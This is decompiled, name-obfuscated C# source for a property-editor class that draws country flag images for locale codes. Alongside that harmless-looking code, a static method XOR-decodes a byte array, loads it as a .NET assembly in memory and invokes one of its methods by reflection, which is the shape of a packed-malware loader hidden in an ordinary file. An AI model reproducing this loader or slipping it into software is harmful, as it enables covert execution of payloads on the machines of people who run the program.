using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Design;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using Jc97;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace d9
{
	// Token: 0x0200000C RID: 12
	public class k2 : UITypeEditor
	{
		// Token: 0x0600002B RID: 43 RVA: 0x00002E24 File Offset: 0x00001024
		public virtual bool Xm(ITypeDescriptorContext A_1)
		{
			return true;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002F18 File Offset: 0x00001118
		public virtual void Ez(PaintValueEventArgs A_1)
		{
			bool flag = Information.IsNothing(RuntimeHelpers.GetObjectValue(A_1.Value));
			if (!flag)
			{
				string text = A_1.Value.ToString();
				uint num = Xf0i.Da7j(text);
				Bitmap bitmap;
				if (num <= 1434653370U)
				{
					if (num <= 907337542U)
					{
						if (num != 83303646U)
						{
							if (num != 376747596U)
							{
								if (num == 907337542U)
								{
									if (Operators.CompareString(text, "ar-JO", false) == 0)
									{
										object instance;
										bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Jordan", new object[0], null, null, null);
										goto IL_5F1;
									}
								}
							}
							else if (Operators.CompareString(text, "fr-FR", false) == 0)
							{
								object instance;
								bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "France", new object[0], null, null, null);
								goto IL_5F1;
							}
						}
						else if (Operators.CompareString(text, "ru-RU", false) == 0)
						{
							object instance;
							bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Russia", new object[0], null, null, null);
							goto IL_5F1;
						}
					}
					else if (num != 1137391956U)
					{
						if (num != 1413670250U)
						{
							if (num == 1434653370U)
							{
								if (Operators.CompareString(text, "it-IT", false) == 0)
								{
									object instance;
									bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Italy", new object[0], null, null, null);
									goto IL_5F1;
								}
							}
						}
						else if (Operators.CompareString(text, "hu-HU", false) == 0)
						{
							object instance;
							bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Hungary", new object[0], null, null, null);
							goto IL_5F1;
						}
					}
					else if (Operators.CompareString(text, "nl-NL", false) == 0)
					{
						object instance;
						bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Netherlands", new object[0], null, null, null);
						goto IL_5F1;
					}
				}
				else if (num <= 2196609786U)
				{
					if (num != 1664981344U)
					{
						if (num != 2194893224U)
						{
							if (num == 2196609786U)
							{
								if (Operators.CompareString(text, "de-DE", false) == 0)
								{
									object instance;
									bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Germany", new object[0], null, null, null);
									goto IL_5F1;
								}
							}
						}
						else if (Operators.CompareString(text, "es-ES", false) == 0)
						{
							object instance;
							bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Spain", new object[0], null, null, null);
							goto IL_5F1;
						}
					}
					else if (Operators.CompareString(text, "pt-BR", false) == 0)
					{
						object instance;
						bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Brazil", new object[0], null, null, null);
						goto IL_5F1;
					}
				}
				else if (num <= 3100171258U)
				{
					if (num != 2723579257U)
					{
						if (num == 3100171258U)
						{
							if (Operators.CompareString(text, "ro-RO", false) == 0)
							{
								object instance;
								bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Romania", new object[0], null, null, null);
								goto IL_5F1;
							}
						}
					}
					else if (Operators.CompareString(text, "en-US", false) == 0)
					{
						object instance;
						bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "USA", new object[0], null, null, null);
						goto IL_5F1;
					}
				}
				else if (num != 3754111534U)
				{
					if (num == 3973517379U)
					{
						if (Operators.CompareString(text, "zh-TW", false) == 0)
						{
							object instance;
							bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Taiwan", new object[0], null, null, null);
							goto IL_5F1;
						}
					}
				}
				else if (Operators.CompareString(text, "fi-FI", false) == 0)
				{
					object instance;
					bitmap = (Bitmap)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, "Resources", new object[0], null, null, null), null, "Flags", new object[0], null, null, null), null, "Finland", new object[0], null, null, null);
					goto IL_5F1;
				}
				return;
				IL_5F1:
				Rectangle bounds = A_1.Bounds;
				bitmap.MakeTransparent();
				A_1.Graphics.DrawImage(bitmap, bounds);
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00003534 File Offset: 0x00001734
		internal static void m5(byte[] A_0)
		{
			checked
			{
				using (MemoryStream memoryStream = new MemoryStream(A_0))
				{
					int num = A_0.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = i % 8 == 0;
						if (flag)
						{
							A_0[i] ^= 93;
						}
					}
					Assembly assembly = Assembly.Load(memoryStream.ToArray());
					object[] types = assembly.GetTypes();
					object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(types[24], null, "GetMethods", new object[0], null, null, null));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[]
					{
						0
					}, null));
					bool flag2 = objectValue2 != null;
					if (flag2)
					{
						NewLateBinding.LateCall(objectValue2, null, "Invoke", new object[]
						{
							null,
							new object[0]
						}, null, null, null, true);
					}
				}
			}
		}
	}
}
